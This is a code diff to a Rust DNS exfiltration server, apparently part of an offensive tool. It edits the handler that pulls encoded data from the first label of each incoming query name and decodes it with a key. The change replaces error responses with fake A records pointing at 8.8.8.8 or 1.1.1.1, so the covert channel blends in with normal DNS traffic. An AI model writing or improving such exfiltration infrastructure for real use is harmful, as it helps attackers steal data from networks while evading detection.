@@ -1,4 +1,4 @@
-use log::{info,debug,error};
+use log::{info,debug,error,warn};
 use colored::Colorize;
 use std::collections::HashMap;
 
@@ -32,7 +32,6 @@ pub fn dns_exfiltrator(
     }
 }
 
-/// Get DNS query and send data to get_data function
 fn handle_query(
     socket: &UdpSocket,
     id_hexadata: &mut HashMap<String, String>,
@@ -51,25 +50,39 @@ fn handle_query(
 
     if let Some(question) = request.questions.pop() {
         debug!("Received query: {:?}", question.name);
-        // Here I get the data I'm interested in and I parse them
-        let splited = question.name.split(".");
-        let datas = splited.collect::<Vec<&str>>()[0];
-        get_data(
-            datas.to_string(),
-            id_hexadata,
-            key,
-        );
-        packet.header.rescode = ResultCode::FORMERR;
+    
+        // Extraction et traitement
+        let datas = question.name.split('.').next().unwrap_or("");
+        if let Err(e) = get_data(datas.to_string(), id_hexadata, key) {
+            error!("Error while processing data: {:?}", e);
+        }
+    
+        // Préparation de la réponse
+        packet.header.rescode = ResultCode::NOERROR;
+        packet.questions.push(question.clone());
+    
+        // Réponse A fictive
+        packet.answers.push(DnsRecord::A {
+            domain: question.name.clone(),
+            addr: "8.8.8.8".parse::<Ipv4Addr>().expect("Adresse IP invalide"),
+            ttl: 60,
+        });
     } else {
-        packet.header.rescode = ResultCode::FORMERR;
+        warn!("Received malformed request: no question in packet");
+    
+        packet.header.rescode = ResultCode::NOERROR;
+        packet.answers.push(DnsRecord::A {
+            domain: "unknown.".to_string(),
+            addr: "1.1.1.1".parse::<Ipv4Addr>().expect("Adresse IP invalide"),
+            ttl: 60,
+        });
     }
-
+    
+    // Envoi
     let mut res_buffer = BytePacketBuffer::new();
     packet.write(&mut res_buffer)?;
-
     let len = res_buffer.pos();
     let data = res_buffer.get_range(0, len)?;
-
     socket.send_to(data, src)?;
 
     Ok(())
